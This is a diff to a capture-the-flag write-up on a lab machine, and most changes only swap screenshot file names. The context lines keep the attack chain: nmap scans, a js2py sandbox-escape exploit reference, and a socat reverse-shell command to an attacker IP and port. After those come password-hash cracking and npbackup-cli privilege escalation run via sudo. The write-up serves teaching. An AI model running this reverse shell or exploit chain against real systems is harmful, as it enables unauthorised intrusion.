@@ -14,11 +14,11 @@ sleep 5 && nmap -Pn 10.129.237.227 -sC -sV -v -oN nmap_sVsC.txt && \
 sleep 5 && nmap -T5 -Pn 10.129.237.227 -v --script vuln -oN nmap_vuln.txt
 ```
 
-![](images/image1.png)
+![](images/image2.png)
 
 ## **📦 Application Enumeration**
 
-[![](images/image2.png)](https://github.com/Ma*rven11/CVE-2024-28397-js2py-Sandbox-Escape)
+[![](images/image11.png)](https://github.com/Ma*rven11/CVE-2024-28397-js2py-Sandbox-Escape)
 
 We discover a `/download` endpoint allowing us to retrieve `app.zip`. After extraction:
 
@@ -28,11 +28,11 @@ cd app
 cat app.py
 ```
 
-![](images/image3.png)
+![](images/image13.png)
 
 Checking the dependencies in `requirements.txt`:
 
-![](images/image4.png)
+![](images/image8.png)
 
 ## **⚡ Exploitation – CVE-2024-28397 (js2py Sandbox Escape)**
 
@@ -70,7 +70,7 @@ console.log(n11)
 n1
 ```
 
-![](images/image5.png)
+![](images/image14.png)
 
 ## **🖥️ Reverse Shell & Stabilization**
 
@@ -85,13 +85,13 @@ chmod +x socatx4.bin
 ./socatx64.bin exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.16.14:4444
 ```
 
-![](images/image7.png)
+![](images/image4.png)
 
 ## **🗄️ Database Discovery**
 
 Inside the `instance` folder we discover a SQLite database:
 
-![](images/image8.png)
+![](images/image7.png)
 
 The database contains user password hashes:
 
@@ -99,11 +99,11 @@ The database contains user password hashes:
 
 Identifying the hash format:
 
-![](imagesimage10.png)
+![](images/image5.png)
 
 We successfully crack `marco’s` password hash:
 
-![](images/image11.png)
+![](images/image15.png)
 
 ## **👤 User Access**
 
@@ -117,13 +117,15 @@ We obtain the `user flag` from Marco’s desktop
 
 We identify a privilege escalation vector via `npbackup-cli`. Reference: [npbackup-cli PrivEsc](https://github.com/AliElKhatteb/npbackup-cli-priv-escalation)
 
+![](images/image1.png)
+
 We modify the exploit (line 11):
 
-![](images/image13.png)
+![](images/image10.png)
 
 Transferred to the host and executed:
 
-![](images/image14.png)
+![](images/image3.png)
 
 ```
 sudo /usr/local/bin/npbackup-cli -c npbackup.conf --backup
